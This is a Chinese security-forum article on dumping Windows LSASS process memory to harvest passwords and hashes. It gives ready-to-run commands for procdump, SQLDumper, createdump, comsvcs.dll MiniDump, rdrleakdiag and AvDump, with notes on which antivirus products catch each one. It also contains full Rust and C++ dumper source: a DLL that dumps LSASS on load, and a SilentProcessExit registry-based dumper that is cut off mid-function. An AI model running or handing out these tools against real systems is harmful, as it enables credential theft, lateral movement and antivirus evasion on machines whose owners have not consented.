# windows-lsass转储篇

> **来源**: https://forum.butian.net/share/2434  
> **文章ID**: 2434

---

windows-lsass转储篇
================

> lsass.exe（Local Security Authority Subsystem Service进程空间中，存有着机器的域、本地用户名和密码等重要信息。如果获取本地高权限，用户便可以访问LSASS进程内存，从而可以导出内部数据（password），用于横向移动和权限提升。通过lsass转储用户密码或者hash也算是渗透过程中必不可少的一步，这里学习一下原理以及记录下多种转储方法。

\[toc\]

常规方法
----

### mimikatz::logonpasswords

> 我们通常将这些工具称为LOLBins，指攻击者可以使用这些二进制文件执行超出其原始目的的操作。 我们关注LOLBins中导出内存的程序。

白名单工具
-----

三个微软签名的白名单程序

```php
Procdump.exe
SQLDumper.exe
createdump.exe
```

### Procdump转储Lsass.exe的内存

ProcDump是微软签名的合法二进制文件，被提供用于转储进程内存。可以在微软文档中下载官方给出的[ProcDump文件](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)

用Procdump 抓取lsass进程dmp文件，

```php
procdump64.exe -accepteula -ma lsass.exe lsass_dump
```

然后可以配置mimikatz使用

```php
sekurlsa::Minidump lsassdump.dmp
sekurlsa::logonPasswords
```

如果对lsass.exe敏感的话，那么还可以配合lsass.exe的pid来使用

```php
procdump64.exe -accepteula -ma pid lsass_dum
```

这种原理是lsass.exe是Windows系统的安全机制，主要用于本地安全和登陆策略，通常在我们登陆系统时输入密码后，密码便会存贮在lsass.exe内存中，经过wdigest和tspkg两个模块调用后，对其使用可逆的算法进行加密并存储在内存中，而Mimikatz正是通过对lsass.exe逆算获取到明文密码。

关于查杀情况，火绒病毒查杀并没有扫描到，360在13版本下也没检测到在14版本被查杀了。

### SQLDumper.exe

Sqldumper.exe实用工具包含在 Microsoft SQL Server 中。 它生成用于调试目的SQL Server和相关进程的内存转储。  
![](images/attach-3dea37cad4e202ecad55f.png)  
sqldumper的常见路径如下

```php
C:\Program Files\Microsoft SQL Server\100\Shared\SqlDumper.exe

C:\Program Files\Microsoft Analysis Services\AS OLEDB\10\SQLDumper.exe

C:\Program Files (x86)\Microsoft SQL Server\100\Shared\SqlDumper.exe
```

SQLDumper.exe包含在Microsoft SQL和Office中，可生成完整转储文件。

```php
tasklist /svc | findstr lsass.exe  查看lsass.exe 的PID号
Sqldumper.exe ProcessID 0 0x01100  导出mdmp文件
```

再本地解密即可需要使用相同版本操作系统。

```php
mimikatz.exe "sekurlsa::minidump SQLDmpr0001.mdmp" "sekurlsa::logonPasswords full" exit
```

被360查杀，火绒没有检测  
![](images/attach-3dea37cad4e202ecad55f.png)

### createdump.exe

随着.NET5出现的，本身是个native binary.虽然有签名同样遭到AV查杀  
![](images/attach-3dea37cad4e202ecad55f.png)

```php
createdump.exe -u -f lsass.dmp lsass[PID]
```

同样会被360查杀

### comsvcs.dll

comsvcs.dll主要是提供COM+ Services服务。每个Windows系统中都可以找到该文件，可以使用Rundll32执行其导出函数MiniDump实现进程的完全转储。

该文件是一个白名单文件，我们主要是利用了Comsvsc.dll中的导出函数APIMiniDump来实现转储lsass.exe的目的，注意同样是需要管理员权限。因为需要开启SeDebugPrivilege权限。而在cmd中此权限是默认禁用的，powershell是默认启用的。  
`该文件位于C:\windows\system32\comsvcs.dll`  
![](images/attach-3dea37cad4e202ecad55f.png)

可以这样使用如下方式来调用MiniDump实现转储lsass.exe进程:

```php
powershell C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
```

360同样查杀,这种直接通过调用`APIMiniDump`来dump内存的行为还是太过敏感，不稍微修改很容易就被查杀。  
![](images/attach-3dea37cad4e202ecad55f.png)

其它工具
----

### rdleakdiag.exe

默认存在的系统：

Windows 10 Windows 8.1 Windows 8 Windows7 windows Vista  
软件版本 10.0.15063.0 6.3.9600.17415 6.2.9200.16384 6.1.7600.16385 6.0.6001.18000  
没有的情况可以选择传一个上去。  
![](images/attach-3dea37cad4e202ecad55f.png)  
生成dmp内存文件

```php
rdrleakdiag.exe /p <pid> /o <outputdir> /fullmemdmp /wait 1 Rst
```

会产生两个文件，results*+进程pid+.hlk，minidump*+进程pid+.dmp。然后同样使用mimikatz进行破解。

### AvDump.exe

AvDump.exe是Avast杀毒软件中自带的一个程序，可用于转储指定进程（lsass.exe）内存数据，它带有Avast杀软数字签名。所以一般不会被av查杀。  
下载地址：<https://www.pconlife.com/viewfileinfo/avdump64-exe/#fileinfoDownloadSaveInfodivGoto2>  
需要在ps中调用，否则cmd默认是不开启seDEBUGPrivilege权限的，但是现在360会检测到avdump.

```php
.\AvDump.exe --pid <lsass pid> --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\Users\admin\Desktop\lsass.dmp --min_interval 0
```

但也是会被360查杀。

自主编写dll
-------

### 调用APIMiniDump的一个demo

这里涉及到windows进程编程，可以先看看如何遍历windows下的进程。遍历进程需要几个API和一个结构体。

```php
​ 1.创建进程快照
​ 2.初始化第一个要遍历的进程
​ 3.继续下次遍历
​ 4.进程信息结构体
```

创建进程使用`CreateToolhelp32Snapshot`

```c
HANDLE WINAPI CreateToolhelp32Snapshot(
DWORD dwFlags, //用来指定“快照”中需要返回的对象，可以是TH32CS_SNAPPROCESS等
DWORD th32ProcessID //一个进程ID号，用来指定要获取哪一个进程的快照，当获取系统进程列表或获取 当前进程快照时可以设为0
);
```

获取第一个进程句柄使用`Process32First`

```c
BOOL WINAPI Process32First(
    HANDLE hSnapshot,//_in，进程快照句柄
    LPPROCESSENTRY32 lppe//_out，传入进程信息结构体,系统帮你填写.
);
```

获取下一个进程使用`Process32Next`

```c
BOOL WINAPI Process32Next(
  HANDLE hSnapshot,      　　从CreateToolhelp32Snapshot 返回的句柄
  LPPROCESSENTRY32 lppe     指向PROCESSENTRY32结构的指针，进程信息结构体
);
```

其中还涉及到`PROCESSENTRY32`的结构体对我们有用的就是

- dwSize 初始化结构体的大小
- th32ProcessId 进程ID
- szExeFile\[MAX\_PATH\] 进程路径
    
    ```c
    typedef struct tagPROCESSENTRY32 {
    DWORD dwSize; // 结构大小，首次调用之前必须初始化；
    DWORD cntUsage; // 此进程的引用计数，为0时则进程结束；
    DWORD th32ProcessID; // 进程ID;
    DWORD th32DefaultHeapID; // 进程默认堆ID；
    DWORD th32ModuleID; // 进程模块ID；
    DWORD cntThreads; // 此进程开启的线程计数；
    DWORD th32ParentProcessID;// 父进程ID；
    LONG pcPriClassBase; // 线程优先权；
    DWORD dwFlags; // 保留；
    char szExeFile[MAX_PATH]; // 进程全名；
    } PROCESSENTRY32;
    ```
    
    所以rust实现的代码如下
    
    ```rust
    fn getProcess(){
    unsafe{
        let mut handle =  CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD,0);
        let mut process_entry : PROCESSENTRY32 = zeroed();
        process_entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
        // let mut process_handle = null_mut();
    
        if !handle.is_null() {
            if Process32First(handle, &mut process_entry) == 1{
                loop {
                    let extFileName = OsString::from_wide(process_entry.szExeFile.iter().map(|&x| x as u16).take_while(|&x| x > 0).collect::<Vec<u16>>().as_slice());
                    println!("{:?}----------{:?}",extFileName,process_entry.th32ProcessID);
                    if Process32Next(handle, &mut process_entry) == 0{
                        break;
                    }
                }
            }
        }
    }
    }
    ```

![](images/attach-3dea37cad4e202ecad55f.png)

完整dump lsass进程内存的代码

```rust
use std::{mem::{ size_of}, ffi::{CStr, OsString, c_void, OsStr}, os::windows::prelude::{OsStringExt, AsRawHandle, RawHandle, OsStrExt}, fs::File, path::{Path, self}};
use std::ptr;
use clap::{App,Arg};
use log::{error};
use windows_sys::{Win32::{Foundation::{
    CloseHandle, GetLastError, INVALID_HANDLE_VALUE, HANDLE, LUID,
}, Security::{TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, LookupPrivilegeValueA, AdjustTokenPrivileges}, System::{Threading::OpenProcessToken, Diagnostics::ToolHelp::TH32CS_SNAPTHREAD}, Storage::FileSystem::CreateFileA}, core::PCSTR};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileW,CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
};
use windows_sys::Win32::System::Diagnostics::Debug::{
    MiniDumpWithFullMemory,MiniDumpWriteDump
};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};

use windows_sys::Win32::System::SystemServices::GENERIC_ALL;
use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

fn getPrivilege(handle : HANDLE){
    unsafe{
        let mut h_token: HANDLE =  HANDLE::default();
        let mut h_token_ptr: *mut HANDLE = &mut h_token;
        let mut tkp: TOKEN_PRIVILEGES = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: LUID {
                    LowPart: 0,
                    HighPart: 0,
                },
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };
        // 打开当前进程的访问令牌
        let token = OpenProcessToken(handle, TOKEN_ADJUST_PRIVILEGES, h_token_ptr);
        if   token != 0 {
            let systemname  = ptr::null_mut();
            if  LookupPrivilegeValueA(
                systemname,
                b"SeDebugPrivilege\0".as_ptr(),
                &mut tkp.Privileges[0].Luid) != 0 {
                tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                // println!("{:?}",tkp.Privileges[0].Attributes);
                // 提升当前进程的 SeDebugPrivilege 权限
                if  AdjustTokenPrivileges(
                    h_token,
                    0, 
                    &tkp  as *const TOKEN_PRIVILEGES, 
                    0, 
                    ptr::null_mut(), 
                    ptr::null_mut()) != 0 {
                    println!("Token privileges adjusted successfully");
                } else {
                    let last_error = GetLastError() ;
                    println!("AdjustTokenPrivileges failed with error: STATUS({:?})", last_error);
                }
            } else {
                let last_error = GetLastError() ;
                println!("LookupPrivilegeValue failed with error: STATUS({:?})", last_error);
            }
            // 关闭访问令牌句柄
                CloseHandle(h_token);
        } else {
            let last_error = GetLastError() ;
            println!("OpenProcessToken failed with error: STATUS({:?})", last_error);
        }
    }
}

fn getProcess(LsassFile : &str) {

    unsafe{
        let mut h_snapshot =  CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if h_snapshot == INVALID_HANDLE_VALUE {
            println!("Failed to call CreateToolhelp32Snapshot");
        }
        let mut process_entry: PROCESSENTRY32 = std::mem::zeroed::<PROCESSENTRY32>()   ;
        process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

        if Process32First(h_snapshot, &mut process_entry) == 0 {
            println!("Process32First error");
        }

        loop {
            let extFileName = CStr::from_ptr(process_entry.szExeFile.as_ptr() as *const i8).to_bytes();
            let extfile = OsString::from_wide(extFileName.iter().map(|&x| x as u16).collect::<Vec<u16>>().as_slice()).to_string_lossy().into_owned();
            if extfile.starts_with("lsass.exe"){
                println!("[+] Got {:?} PID: {:?}",extfile,process_entry.th32ProcessID);
                break;
            }
            if Process32Next(h_snapshot, &mut process_entry) == 0 {
                println!("Failed to call Process32Next");
                break;
            }
        }
        let lsass_pid = process_entry.th32ProcessID;
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsass_pid);
        if process_handle == 0 {
            println!("Fail to open the process ");
        }
        let lsassFile = LsassFile;
        let lsassFile: Vec<u16> = OsStr::new(lsassFile).encode_wide().chain(Some(0).into_iter()).collect();
        let lsasshandle = CreateFileW(
            lsassFile.as_ptr() as *const u16,
            GENERIC_ALL,
            0,
            ptr::null_mut(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            0,
        );
        if lsasshandle == INVALID_HANDLE_VALUE {
            println!("Fail to open/create file {:?}",LsassFile.to_string());
        }
        let result = MiniDumpWriteDump(
            process_handle,
            lsass_pid,
            lsasshandle,
            MiniDumpWithFullMemory,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
        );
        println!("{:?}",result);
        if result == 1
        {
            println!("Dump successful with file  {:?}",LsassFile.to_string());
        } else {
            println!("Dump error {:?}", GetLastError());
        }
        let status = CloseHandle(lsasshandle);
        if status != 1 {
            error!("Fail to Close file handle");
        }
    }
}

fn main() {
    let matches = App::new("SysWhispers3 - SysWhispers on steroids")
    .arg(Arg::with_name("DumpFileName")
        .short("f")
        .long("DumpFileName")
        .takes_value(true)
        .help("DumpFileName Path like C:\\temp.dmp")).get_matches();
    let mut out_file = "";
    if   matches.is_present("DumpFileName") {
        out_file = matches.value_of("DumpFileName").expect("get DumpFileName args error");
    }else {
        out_file = "lsass.dmp";
    }
    getProcess(out_file);

}

```

当然我们直接这样写的代码肯定是会被无情的拦截的，这类API大家已经再熟悉不过了，肯定是被拦截的很严重的。

### 编写Dump Lsass的DLL(yes)

其实就是为了解决直接使用Comsvsc.dll中的`APIMiniDump`函数容易被用户模式下的API hook拦截的问题。dll编写的思路一般是

- 获取Debug权限
- 找到lsass的PID
- 使用MiniDump或MiniDumpWriteDump进行内存dump

首先需要解决权限提升的问题，这里常用的是RtlAdjustPrivilege函数来进行权限提升，这个函数封装在NtDll.dll中。这个函数的定义和解释:

```php
NTSTATUS RtlAdjustPrivilege(
  ULONG               Privilege,
  BOOLEAN             Enable,
  BOOLEAN             CurrentThread,
  PBOOLEAN            Enabled
);
```

函数说明：

RtlAdjustPrivilege 函数用于启用或禁用当前线程或进程的特权。调用此函数需要进程或线程具有 SE\_TAKE\_OWNERSHIP\_NAME 特权或调用者已经启用了此特权。

参数说明：

- Privilege：要调整的特权的标识符。可以是一个 SE\_PRIVILEGE 枚举值或一个特权名称字符串。
- Enable：指示是启用（TRUE）还是禁用（FALSE）特权。
- CurrentThread：指示要调整特权的是当前线程（TRUE）还是当前进程（FALSE）。
- Enabled：输出参数，返回调整特权操作的结果。如果特权成功启用或禁用，则返回 TRUE；否则返回 FALSE。

返回值：

- 如果函数成功执行，则返回 STATUS\_SUCCESS；否则返回错误代码。

需要注意的是，该函数并不是公开的 Win32 API 函数，而是 Windows 内核函数，只能从其他内核函数中调用。

我们首先调用 OpenProcessToken 函数打开当前进程的访问令牌。然后，使用 LookupPrivilegeValue 函数获取 SE\_DEBUG\_NAME 权限的本地权限 ID。接着，我们定义了一个 TOKEN\_PRIVILEGES 结构体，将 SE\_DEBUG\_NAME 权限添加到该结构体中，并通过 AdjustTokenPrivileges 函数提升当前进程的权限。最后，我们关闭了访问令牌句柄并退出程序。  
所以提升权限可以这样写

```c++
void getPrivilege()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    // 打开当前进程的访问令牌
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        // 获取 SeDebugPrivilege 权限的本地权限 ID
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid))
        {
            tkp.PrivilegeCount = 1;
            tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            // 提升当前进程的 SeDebugPrivilege 权限
            if (AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, NULL))
            {
                std::cout << "Token privileges adjusted successfully" << std::endl;

                // 关闭访问令牌句柄
                CloseHandle(hToken);
            }
            else {
                std::cout << "AdjustTokenPrivileges faile" << std:endl;
            }
        }
        else {
            std::cout << "LookupPrivilegeValue faile" << std::endl;
        }
    }
    else {
        std::cout << "OpenProcessToken faile" << std::endl;
    }

}

```

再配合上获取lsass进程pid和dump 进程后完整代码就是

```c
#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include <iostream>
using namespace std;
typedef HRESULT(WINAPI* _MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);

int GetLsassPid() {

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(hSnapshot, &entry)) {
        while (Process32Next(hSnapshot, &entry)) {
            if (wcscmp(entry.szExeFile, L"lsass.exe") == 0) {
                return entry.th32ProcessID;
            }
        }
    }

    CloseHandle(hSnapshot);
    return 0;
}
void getPrivilege()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    // 打开当前进程的访问令牌
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        // 获取 SeDebugPrivilege 权限的本地权限 ID
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid))
        {
            tkp.PrivilegeCount = 1;
            tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            // 提升当前进程的 SeDebugPrivilege 权限
            if (AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, NULL))
            {
                cout << "Token privileges adjusted successfully" << endl;

                // 关闭访问令牌句柄
                CloseHandle(hToken);
            }
            else {
                cout << "AdjustTokenPrivileges faile" << endl;
            }
        }
        else {
            cout << "LookupPrivilegeValue faile" << endl;
        }
    }
    else {
        cout << "OpenProcessToken faile" << endl;
    }

}
void DumpLsass()
{
    wchar_t  ws[100];
    _MiniDumpW MiniDumpW;

    MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L"comsvcs.dll"), "MiniDumpW");
    cout << "GetProcAddress MiniDumpW success" << endl;
    swprintf(ws, 100, L"%u %hs", GetLsassPid(), "C:\\temp.bin full");   

    getPrivilege();

    MiniDumpW(0, 0, ws);
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DumpLsass();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
int main() {
    DumpLsass();
}
```

SilentProcessExit进行Dump
-----------------------

> 具体原理参考文章：[利用SilentProcessExit机制dump内存](https://mp.weixin.qq.com/s/8uEr5dNaQs24KuKxu5Yi9w)
> 
> Silent Process Exit，即静默退出。而这种调试技术，可以派生 werfault.exe进程，可以用来运行任意程序或者也可以用来转存任意进程的内存文件或弹出窗口。在某个运行中的进程崩溃时，werfault.exe将会Dump崩溃进程的内存，从这一点上看，我们是有可能可以利用该行为进行目标进程内存的Dump。
> 
> 优点：系统正常行为  
> 缺点：需要写注册表
> 
> 该机制提供了在两种情况下可以触发对被监控进行进行特殊动作的能力：
> 
> - （1）被监控进程调用 ExitProcess() 终止自身；

- （2）其他进程调用 TerminateProcess() 结束被监控进程。

也就意味着当进程调用ExitProcess() 或 TerminateProcess()的时候，可以触发对该进程的如下几个特殊的动作:

```php
- 启动一个监控进程
- 显示一个弹窗
- 创建一个Dump文件
```

但由于该功能默认不开启，我们需要对注册表进行操作，来开启该功能，主要的注册表项为：

```php
添加此子键
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe
名称               类型               数据
DumpType            REG_DWORD     完全转储目标进程内存的值为MiniDumpWithFullMemory (0x2)
LocalDumpFolder     REG_SZ        (DUMP文件被存放的目录，默认为%TEMP%\\Silent Process Exit)c:\temp
ReportingMode（REG_DWORD）    REG_DWORD   a）LAUNCH_MONITORPROCESS (0x1) – 启动监控进程；
                                              b）LOCAL_DUMP (0x2) – 为导致被监控进程终止的进程和被监控进程本身 二者 创建DUMP文件；
                                              c）NOTIFICATION (0x4) – 显示弹窗。

添加此子键
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe
名称              类型          数据
GlobalFlag      REG_DWORD     0x200
```

![](images/attach-3dea37cad4e202ecad55f.png)

另外就是第二个注册表，这个主要是设置dump内存的一些细节问题，比如dump的位置、崩溃后操作的类型，这类选择的是LOCAL\_DUMP，即0x2也就是为导致终止的进程和终止的进程创建一个转储文件。  
![](images/attach-3dea37cad4e202ecad55f.png)

这里我们需要使用的是MiniDumpWithFullMemory对应的值是0x2。  
![](images/attach-4d7f4b772ab55c802f124483d0c917a2a9f36ebc.png)

关于MiniDumpWithFullMemory，其都定义在MINIDUMP\_TYPE之中，其结构体如下：

```php
typedef enum _MINIDUMP_TYPE {
  MiniDumpNormal,
  MiniDumpWithDataSegs,
  MiniDumpWithFullMemory,
  MiniDumpWithHandleData,
  MiniDumpFilterMemory,
  MiniDumpScanMemory,
  MiniDumpWithUnloadedModules,
  MiniDumpWithIndirectlyReferencedMemory,
  MiniDumpFilterModulePaths,
  MiniDumpWithProcessThreadData,
  MiniDumpWithPrivateReadWriteMemory,
  MiniDumpWithoutOptionalData,
  MiniDumpWithFullMemoryInfo,
  MiniDumpWithThreadInfo,
  MiniDumpWithCodeSegs,
  MiniDumpWithoutAuxiliaryState,
  MiniDumpWithFullAuxiliaryState,
  MiniDumpWithPrivateWriteCopyMemory,
  MiniDumpIgnoreInaccessibleMemory,
  MiniDumpWithTokenInformation,
  MiniDumpWithModuleHeaders,
  MiniDumpFilterTriage,
  MiniDumpWithAvxXStateContext,
  MiniDumpWithIptTrace,
  MiniDumpScanInaccessiblePartialPages,
  MiniDumpValidTypeFlags
} MINIDUMP_TYPE;

```

下面就是让lsass进程终止了，但是lsass.exe是系统进程，如果彻底终止就会导致系统蓝屏从而重启电脑，但是我们的目的只是为了转储lsass进程而不让电脑重启，这个时候我们就用到了RtlReportSilentProcessExit这个api，该API将与Windows错误报告服务（WerSvcGroup下的WerSvc）通信，告诉服务该进程正在执行静默退出。然后，WER服务将启动WerFault.exe，该文件将转储现有进程。值得注意的是，调用此API不会导致进程退出。其定义如下：

```php

NTSTATUS （NTAPI * RtlReportSilentProcessExit ）（
        _In_      HANDLE      ProcessHandle，
        _In_      NTSTATUS    ExitStatus 
       ）;
```

所以最终的流程就是类似如图  
![](images/attach-d9c35a5236c22de8ee8a3fa650637f24ae36f908.png)

作者的代码中，提供了两种方法来实现崩溃，一种是直接调用RtlReportSilentProcessExit，而另一种则是使用CreateRemoteThread()来实现，实际上就是远程在LSASS中创建线程执行`RtlReportSilentProcessExit`。

这里使用的是第一种方式来实现的。  
代码 <https://github.com/haoami/RustHashDump>

```rust
use std::{mem::{ size_of, transmute}, ffi::{CStr, OsString, c_void, OsStr, CString}, os::windows::prelude::{OsStringExt, AsRawHandle, RawHandle, OsStrExt}, fs::File, path::{Path, self}, ptr::null_mut, process::ExitStatus};
use std::ptr;
use clap::{App,Arg};
use log::{error};
use windows_sys::{Win32::{Foundation::{
    CloseHandle, GetLastError, INVALID_HANDLE_VALUE, HANDLE, LUID, NTSTATUS,
}, Security::{TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, LookupPrivilegeValueA, AdjustTokenPrivileges}, System::{Threading::{OpenProcessToken, GetCurrentProcess, PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_READ}, Diagnostics::ToolHelp::TH32CS_SNAPTHREAD, Registry::{HKEY_LOCAL_MACHINE, HKEY, RegOpenKeyExW, KEY_READ, KEY_WRITE, RegCreateKeyExW, KEY_SET_VALUE, RegSetValueExA, REG_DWORD, KEY_ALL_ACCESS, REG_SZ, RegCreateKeyA, REG_CREATED_NEW_KEY}, LibraryLoader::{GetModuleHandleA, GetProcAddress, GetModuleHandleW}}, Storage::FileSystem::CreateFileA, UI::WindowsAndMessaging::GetWindowModuleFileNameA}, core::PCSTR};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileW,CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
};
use windows_sys::Win32::System::Diagnostics::Debug::{
    MiniDumpWithFullMemory,MiniDumpWriteDump
};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};

use windows_sys::Win32::System::SystemServices::GENERIC_ALL;
use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

type FnRtlreportSilentProcessExit = unsafe extern "system" fn(HANDLE, NTSTATUS) -> NTSTATUS;

fn getPrivilege(handle : HANDLE){
    unsafe{
        let mut h_token: HANDLE =  HANDLE::default();
        let mut h_token_ptr: *mut HANDLE = &mut h_token;
        let mut tkp: TOKEN_PRIVILEGES = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: LUID {
                    LowPart: 0,
                    HighPart: 0,
                },
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };
        // 打开当前进程的访问令牌
        let token = OpenProcessToken(handle, TOKEN_ADJUST_PRIVILEGES, h_token_ptr);
        if   token != 0 {
            let systemname  = ptr::null_mut();
            if  LookupPrivilegeValueA(
                systemname,
                b"SeDebugPrivilege\0".as_ptr(),
                &mut tkp.Privileges[0].Luid) != 0 {
                tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                // println!("{:?}",tkp.Privileges[0].Attributes);
                // 提升当前进程的 SeDebugPrivilege 权限
                if  AdjustTokenPrivileges(
                    h_token,
                    0, 
                    &tkp  as *const TOKEN_PRIVILEGES, 
                    0, 
                    ptr::null_mut(), 
                    ptr::null_mut()) != 0 {
                    println!("Token privileges adjusted successfully");
                } else {
                    let last_error = GetLastError() ;
                    println!("AdjustTokenPrivileges failed with error: STATUS({:?})", last_error);
                }
            } else {
                let last_error = GetLastError() ;
                println!("LookupPrivilegeValue failed with error: STATUS({:?})", last_error);
            }
            // 关闭访问令牌句柄
                CloseHandle(h_token);
        } else {
            let last_error = GetLastError() ;
            println!("OpenProcessToken failed with error: STATUS({:?})", last_error);
        }
    }
}

fn getPid(ProcessName : &str) -> u32{
    unsafe{
        let mut h_snapshot =  CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if h_snapshot == INVALID_HANDLE_VALUE {
            println!("Failed to call CreateToolhelp32Snapshot");
        }
        let mut process_entry: PROCESSENTRY32 = std::mem::zeroed::<PROCESSENTRY32>()   ;
        process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

        if Process32First(h_snapshot, &mut process_entry) == 0 {
            println!("Process32First error");
        }

        loop {
            let extFileName = CStr::from_ptr(process_entry.szExeFile.as_ptr() as *const i8).to_bytes();
            let extfile = OsString::from_wide(extFileName.iter().map(|&x| x as u16).collect::<Vec<u16>>().as_slice()).to_string_lossy().into_owned();
            if extfile.starts_with(ProcessName){

                break;
            }
            if Process32Next(h_snapshot, &mut process_entry) == 0 {
                println!("Failed to call Process32Next");
                break;
            }
        }
        process_entry.th32ProcessID
    }
}
fn setRegisterRegs() {
    unsafe{
        let key = HKEY_LOCAL_MACHINE;
        let  IFEO_REG_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe";
        let  SILENT_PROCESS_EXIT_REG_KEY= r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe";

        let subkey = OsString::from(IFEO_REG_KEY).encode_wide().chain(Some(0)).collect::<Vec<_>>();
        let mut hKey = HKEY::default();

        let mut hSubKey = HKEY::default();
        let ret = RegCreateKeyExW(
            key,
            OsString::from(SILENT_PROCESS_EXIT_REG_KEY).encode_wide().chain(Some(0)).collect::<Vec<u16>>().as_ptr(),
            0, 
            null_mut(), 
            0, 
            KEY_ALL_ACCESS, 
            ptr::null_mut(), 
            &mut hSubKey, 
            ptr::null_mut());
        if ret != 0   {
            println!("{:?}",ret);
            println!("[-] CreateKey SilentProcessExit\\lsass.exe ERROR\n");
        }

        let DumpTypevalue = std::mem::transmute::<&i32,*const u8>(&0x02) ;
        let DumpTypekey = CString::new("DumpType").unwrap();
        let ret = RegSetValueExA(
            hSubKey,
            DumpTypekey.as_ptr() as *const u8,
            0,
            REG_DWORD,
            DumpTypevalue,
            size_of::<u32>() as u32
        );
        if ret != 0{
            println!("[-] SetDumpTypeKey SilentProcessExit\\lsass.exe  ERROR\n");
        }

        let ReportingModevalue = std::mem::transmute::<&i32,*const u8>(&0x02) ;
        let ReportingModekey = CString::new("ReportingMode").unwrap();

        let ret = RegSetValueExA(
            hSubKey,
            ReportingModekey.as_ptr() as *const u8,
            0,
            REG_DWORD,
            ReportingModevalue,
            size_of::<u32>() as u32
        );
        if ret != 0{
            println!("[-] SetReportingModevalueKey SilentProcessExit\\lsass.exe ERROR\n");
        }

        let ReportingModevalue = "C:\\temp" ;
        let ReportingModekey = CString::new("LocalDumpFolder").unwrap();
        let ret = RegSetValueExA(
            hSubKey,
            ReportingModekey.as_ptr() as *const u8,
            0,
            REG_SZ,
            ReportingModevalue.as_ptr(),
            ReportingModevalue.len() as u32
        );
        if ret != 0{
            println!("[-] SetReportingModekeyKey SilentProcessExit\\lsass.exe ERROR\n");
        }

        let mut hSubKey = HKEY::default();
        let ret = RegCreateKeyExW(
            key,
            OsString::from(IFEO_REG_KEY).encode_wide().chain(Some(0)).collect::<Vec<u16>>().as_ptr(),
            0, 
            null_mut(), 
            0, 
            KEY_ALL_ACCESS, 
            ptr::null_mut(), 
            &mut hSubKey, 
            ptr::null_mut());
        if ret != 0  {
            println!("[-] CreateKey {:?} ERROR\n",IFEO_REG_KEY);
        }

        let GlobalFlagvalue = std::mem::transmute::<&i32,*const u8>(&0x0200) ;
        let GlobalFlagkey = CString::new("GlobalFlag").unwrap();
        let ret = RegSetValueExA(
            hSubKey,
            GlobalFlagkey.as_ptr() as *const u8,
            0,
            REG_DWORD,
            GlobalFlagvalue,
            size_of::<u32>() as u32
        );
        if ret != 0{
